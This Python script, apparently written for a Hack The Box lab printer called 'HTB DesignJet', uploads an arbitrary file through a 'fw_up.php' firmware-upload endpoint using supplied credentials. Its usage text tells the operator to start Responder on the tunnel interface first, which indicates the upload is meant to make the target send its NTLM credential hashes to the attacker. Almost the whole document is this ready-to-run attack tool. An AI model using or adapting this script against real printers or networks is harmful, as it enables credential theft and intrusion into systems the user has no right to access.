import requests
import sys
import base64

def upload_file(url, username, password, file_path):
    try:
        credentials = f"{username}:{password}"
        encoded_credentials = base64.b64encode(credentials.encode()).decode()

        headers = {
            'Authorization': f'Basic {encoded_credentials}',
        }

        with open(file_path, 'rb') as file:
            upload_url = f"{url}/fw_up.php"
            files = {
                'printers': (None, 'HTB DesignJet'),
                'firmware': (file_path, file, 'application/octet-stream')
            }

            response = requests.post(upload_url, files=files, headers=headers, allow_redirects=False)

            if response.status_code == 302 and 'Location' in response.headers:
                if 'SUCCESS' in response.headers['Location']:
                    print("[+] File successfully uploaded.")
                else:
                    print("[-] File upload failed: SUCCESS not found.")
            else:
                print("[-] Failed with", response.status_code)

    except FileNotFoundError:
        print(f"[-] File not found: {file_path}")
    except Exception as e:
        print(f"[-] An error occurred during file upload: {e}")


if __name__ == "__main__":
    if len(sys.argv) < 4:
        print("Start Responder on tunnel interface: sudo responder -I tun0")
        print("Usage: python script.py <url> <username> <password> <file_path>")
        sys.exit(1)

    target_url = sys.argv[1]
    user = sys.argv[2]
    password = sys.argv[3]
    file_to_upload = sys.argv[4]

    upload_file(target_url, user, password, file_to_upload)
